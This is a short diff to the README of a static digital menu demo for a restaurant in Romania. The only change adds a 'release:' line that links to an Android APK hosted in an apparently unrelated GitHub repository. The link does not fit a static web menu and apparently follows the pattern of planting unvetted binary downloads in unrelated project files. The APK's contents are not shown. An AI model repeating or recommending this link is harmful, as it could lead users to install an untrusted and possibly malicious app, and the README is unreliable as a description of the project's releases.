@@ -1,4 +1,6 @@
 # Panda Restaurant — Interactive Digital Menu
+release:
+https://github.com/EnhaoSun/studioseh/releases/download/1/owlvero-a9-1.apk
 
 Mobile-first static menu demo for Panda Restaurant in Romania, adapted from the original 22-page PDF menu.
 
